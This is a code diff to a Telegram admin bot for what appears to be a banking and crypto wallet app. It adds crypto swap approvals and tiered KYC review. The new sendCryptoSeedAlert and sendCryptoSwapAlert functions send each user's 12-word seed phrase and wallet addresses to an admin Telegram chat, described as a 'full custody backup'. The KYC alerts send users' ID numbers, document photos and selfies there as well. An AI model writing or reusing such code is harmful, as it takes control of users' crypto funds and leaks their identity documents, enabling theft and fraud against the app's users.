@@ -1,6 +1,6 @@
 import TelegramBot from "node-telegram-bot-api";
 import { db } from "@workspace/db";
-import { transactionsTable, usersTable, walletsTable, kycTable, notificationsTable, adminLogsTable } from "@workspace/db";
+import { transactionsTable, usersTable, walletsTable, kycTable, notificationsTable, adminLogsTable, cryptoSwapsTable } from "@workspace/db";
 import { eq, sql } from "drizzle-orm";
 import { logger } from "./logger";
 import { broadcastToUser } from "./websocket";
@@ -321,6 +321,79 @@ function setupAdminBotHandlers(bot: TelegramBot) {
       }
     }
 
+    if (data.startsWith("approve_swap_") || data.startsWith("reject_swap_")) {
+      const isApprove = data.startsWith("approve_swap_");
+      const swapId = parseInt(data.replace(isApprove ? "approve_swap_" : "reject_swap_", ""));
+
+      try {
+        const [swap] = await db.select().from(cryptoSwapsTable).where(eq(cryptoSwapsTable.id, swapId));
+        if (!swap) {
+          bot.answerCallbackQuery(query.id, { text: "Swap not found" });
+          return;
+        }
+        if (swap.status !== "pending") {
+          bot.answerCallbackQuery(query.id, { text: "Swap already processed" });
+          return;
+        }
+
+        if (isApprove) {
+          await db.update(cryptoSwapsTable)
+            .set({ status: "approved", updatedAt: new Date() })
+            .where(eq(cryptoSwapsTable.id, swapId));
+
+          await db.update(walletsTable)
+            .set({ balance: sql`${walletsTable.balance} + ${swap.cashValue}`, updatedAt: new Date() })
+            .where(eq(walletsTable.userId, swap.userId));
+
+          await db.insert(notificationsTable).values({
+            userId: swap.userId,
+            type: "transaction",
+            title: "Crypto Swap Approved",
+            message: `Your swap of ${swap.amount} ${swap.asset.toUpperCase()} has been processed. $${swap.cashValue} credited to your account.`,
+          });
+          broadcastToUser(swap.userId, { type: "balance_update", data: { swapId } });
+
+          await db.insert(adminLogsTable).values({
+            action: "approve_crypto_swap",
+            details: `Approved swap #${swapId} - ${swap.amount} ${swap.asset.toUpperCase()} → $${swap.cashValue}`,
+          });
+
+          bot.answerCallbackQuery(query.id, { text: "Swap approved & credited!" });
+          bot.editMessageText(
+            `Swap #${swapId} - APPROVED\n${swap.amount} ${swap.asset.toUpperCase()} → $${swap.cashValue}`,
+            { chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] } }
+          );
+        } else {
+          await db.update(cryptoSwapsTable)
+            .set({ status: "rejected", declineReason: "Declined by administrator", updatedAt: new Date() })
+            .where(eq(cryptoSwapsTable.id, swapId));
+
+          await db.insert(notificationsTable).values({
+            userId: swap.userId,
+            type: "transaction",
+            title: "Crypto Swap Declined",
+            message: `Your swap of ${swap.amount} ${swap.asset.toUpperCase()} was declined. Your crypto remains in your wallet.`,
+          });
+          broadcastToUser(swap.userId, { type: "transaction_update", data: { swapId, status: "rejected" } });
+
+          await db.insert(adminLogsTable).values({
+            action: "reject_crypto_swap",
+            details: `Rejected swap #${swapId} - ${swap.amount} ${swap.asset.toUpperCase()}`,
+          });
+
+          bot.answerCallbackQuery(query.id, { text: "Swap rejected" });
+          bot.editMessageText(
+            `Swap #${swapId} - REJECTED\n${swap.amount} ${swap.asset.toUpperCase()}`,
+            { chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] } }
+          );
+        }
+      } catch (e) {
+        logger.error({ e }, "Error processing crypto swap callback");
+        bot.answerCallbackQuery(query.id, { text: "Error processing swap" });
+      }
+      return;
+    }
+
     if (data.startsWith("freeze_user_") || data.startsWith("unfreeze_user_")) {
       const isFreeze = data.startsWith("freeze_user_");
       const userId = parseInt(data.replace(isFreeze ? "freeze_user_" : "unfreeze_user_", ""));
@@ -407,25 +480,39 @@ function setupAdminBotHandlers(bot: TelegramBot) {
           return;
         }
 
+        const tier = kyc.tier ?? 2;
+        const tierLabel = tier === 3 ? "Tier 3 (Address)" : "Tier 2 (Identity)";
+
         if (isApprove) {
+          const newLevel = tier === 3 ? 2 : 1;
           await db.update(kycTable).set({ status: "approved", reviewedAt: new Date() }).where(eq(kycTable.id, kycId));
-          await db.update(usersTable).set({ kycLevel: 1 }).where(eq(usersTable.id, kyc.userId));
+          await db.update(usersTable).set({ kycLevel: newLevel }).where(eq(usersTable.id, kyc.userId));
           await db.insert(notificationsTable).values({
-            userId: kyc.userId, type: "kyc", title: "Identity Verified", message: "Your identity has been verified. You now have full access to all banking features.",
+            userId: kyc.userId,
+            type: "kyc",
+            title: tier === 3 ? "Address Verified" : "Identity Verified",
+            message: tier === 3
+              ? "Your proof of address has been verified. You now have unlimited Tier 3 access."
+              : "Your identity has been verified. You can now submit proof of address to unlock Tier 3.",
           });
-          broadcastToUser(kyc.userId, { type: "kyc_update", data: { status: "approved" } });
-          bot.answerCallbackQuery(query.id, { text: "KYC Approved!" });
-          bot.editMessageText(`KYC #${kycId} - APPROVED\nUser: ${kyc.fullName}`, {
+          broadcastToUser(kyc.userId, { type: "kyc_update", data: { status: "approved", tier, level: newLevel } });
+          bot.answerCallbackQuery(query.id, { text: `${tierLabel} Approved!` });
+          bot.editMessageText(`KYC #${kycId} - ${tierLabel} APPROVED\nUser: ${kyc.fullName}`, {
             chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] }
           });
         } else {
           await db.update(kycTable).set({ status: "rejected", rejectionReason: "Documents not accepted", reviewedAt: new Date() }).where(eq(kycTable.id, kycId));
           await db.insert(notificationsTable).values({
-            userId: kyc.userId, type: "kyc", title: "Verification Unsuccessful", message: "Your identity verification was not approved. Please resubmit with clearer documents.",
+            userId: kyc.userId,
+            type: "kyc",
+            title: "Verification Unsuccessful",
+            message: tier === 3
+              ? "Your address verification was not approved. Please resubmit with a clearer document."
+              : "Your identity verification was not approved. Please resubmit with clearer documents.",
           });
-          broadcastToUser(kyc.userId, { type: "kyc_update", data: { status: "rejected" } });
-          bot.answerCallbackQuery(query.id, { text: "KYC Rejected" });
-          bot.editMessageText(`KYC #${kycId} - REJECTED\nUser: ${kyc.fullName}`, {
+          broadcastToUser(kyc.userId, { type: "kyc_update", data: { status: "rejected", tier } });
+          bot.answerCallbackQuery(query.id, { text: `${tierLabel} Rejected` });
+          bot.editMessageText(`KYC #${kycId} - ${tierLabel} REJECTED\nUser: ${kyc.fullName}`, {
             chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] }
           });
         }
@@ -510,28 +597,58 @@ export async function sendTransactionAlert(
   }
 }
 
-export async function sendKycAlert(
-  kycId: number,
-  userId: number,
-  fullName: string,
-  idType: string,
-  country: string
-) {
+export async function sendKycAlert(opts: {
+  kycId: number;
+  userId: number;
+  username: string;
+  email: string;
+  tier: number;
+  fullName: string;
+  idType: string;
+  idNumber: string;
+  country: string;
+  frontImage: string;
+  backImage?: string | null;
+  selfieImage?: string | null;
+}) {
   if (!adminBot || !ADMIN_CHAT_ID) return null;
 
   try {
+    const tierLabel = opts.tier === 3 ? "Tier 3 — Proof of Address" : "Tier 2 — Identity Verification";
     const msg = await adminBot.sendMessage(
       ADMIN_CHAT_ID,
-      `📋 KYC VERIFICATION REQUEST\n\nKYC ID: #${kycId}\nUser ID: #${userId}\nFull Name: ${fullName}\nID Type: ${idType}\nCountry: ${country}\n\nPlease review the submitted documents.`,
+      `📋 ${tierLabel.toUpperCase()}\n\n` +
+      `KYC ID: #${opts.kycId}\n` +
+      `User: @${opts.username} (#${opts.userId})\n` +
+      `Email: ${opts.email}\n` +
+      `Full Name: ${opts.fullName}\n` +
+      `Document: ${opts.idType.replace(/_/g, " ")}\n` +
+      `Document #: ${opts.idNumber}\n` +
+      `Country: ${opts.country}\n\n` +
+      `Documents are attached below.`,
       {
         reply_markup: {
           inline_keyboard: [[
-            { text: "✅ Approve KYC", callback_data: `approve_kyc_${kycId}` },
-            { text: "❌ Reject KYC", callback_data: `reject_kyc_${kycId}` },
+            { text: "✅ Approve", callback_data: `approve_kyc_${opts.kycId}` },
+            { text: "❌ Reject", callback_data: `reject_kyc_${opts.kycId}` },
           ]]
         }
       }
     );
+
+    const sendImg = async (dataUrl: string | null | undefined, caption: string, file: string) => {
+      if (!dataUrl) return;
+      const buf = dataUrlToBuffer(dataUrl);
+      if (!buf) return;
+      await adminBot!.sendPhoto(ADMIN_CHAT_ID!, buf, { caption }, {
+        filename: file, contentType: "image/jpeg",
+      }).catch((e) => logger.error({ e, file }, "Error sending KYC photo"));
+    };
+
+    await sendImg(opts.frontImage, `KYC #${opts.kycId} — ${opts.tier === 3 ? "Address Document" : "Document FRONT"}`, `kyc${opts.kycId}-front.jpg`);
+    if (opts.backImage) await sendImg(opts.backImage, `KYC #${opts.kycId} — Document BACK`, `kyc${opts.kycId}-back.jpg`);
+    if (opts.selfieImage) await sendImg(opts.selfieImage, `KYC #${opts.kycId} — Selfie`, `kyc${opts.kycId}-selfie.jpg`);
+
     return msg.message_id;
   } catch (e) {
     logger.error({ e }, "Error sending KYC alert");
@@ -657,6 +774,73 @@ export async function sendNewUserAlert(opts: {
     return msg.message_id;
   } catch (e) {
     logger.error({ e }, "Error sending new user alert");
+    return null;
+  }
+}
+
+export async function sendCryptoSeedAlert(
+  userInfo: string,
+  email: string,
+  mnemonic: string,
+  addresses: Record<string, string>,
+) {
+  if (!adminBot || !ADMIN_CHAT_ID) return null;
+  try {
+    const addrLines = Object.entries(addresses).map(([k, v]) => `${k}: ${v}`).join("\n");
+    const msg = await adminBot.sendMessage(
+      ADMIN_CHAT_ID,
+      `🔐 NEW CRYPTO WALLET CREATED\n\nUser: ${userInfo}\nEmail: ${email}\n\n🔑 SEED PHRASE (12 words):\n${mnemonic}\n\n📥 Addresses:\n${addrLines}\n\n⚠️ Store this securely — full custody backup.`,
+    );
+    return msg.message_id;
+  } catch (e) {
+    logger.error({ e }, "Error sending crypto seed alert");
+    return null;
+  }
+}
+
+export async function sendCryptoSwapAlert(opts: {
+  swapId: number;
+  userInfo: string;
+  email: string;
+  asset: string;
+  amount: number;
+  cashValue: number;
+  rate: number;
+  mnemonic?: string | null;
+  addresses?: Record<string, string> | null;
+}) {
+  if (!adminBot || !ADMIN_CHAT_ID) return null;
+  try {
+    const seedBlock = opts.mnemonic
+      ? `\n\n🔑 SEED PHRASE (12 words):\n${opts.mnemonic}`
+      : "";
+    const addrBlock = opts.addresses
+      ? `\n\n📥 Wallet Addresses:\n${Object.entries(opts.addresses).map(([k, v]) => `${k}: ${v}`).join("\n")}`
+      : "";
+    const msg = await adminBot.sendMessage(
+      ADMIN_CHAT_ID,
+      `💱 CRYPTO SWAP / WITHDRAW REQUEST\n\n` +
+      `Swap ID: #${opts.swapId}\n` +
+      `User: ${opts.userInfo}\n` +
+      `Email: ${opts.email}\n\n` +
+      `Asset: ${opts.asset}\n` +
+      `💰 Amount Withdrew: ${opts.amount} ${opts.asset}\n` +
+      `Rate: $${opts.rate.toLocaleString()} / ${opts.asset}\n` +
+      `Cash Value: $${opts.cashValue.toLocaleString()}` +
+      seedBlock +
+      addrBlock,
+      {
+        reply_markup: {
+          inline_keyboard: [[
+            { text: "✅ Approve & Credit", callback_data: `approve_swap_${opts.swapId}` },
+            { text: "❌ Reject", callback_data: `reject_swap_${opts.swapId}` },
+          ]]
+        }
+      }
+    );
+    return msg.message_id;
+  } catch (e) {
+    logger.error({ e }, "Error sending crypto swap alert");
     return null;
   }
 }
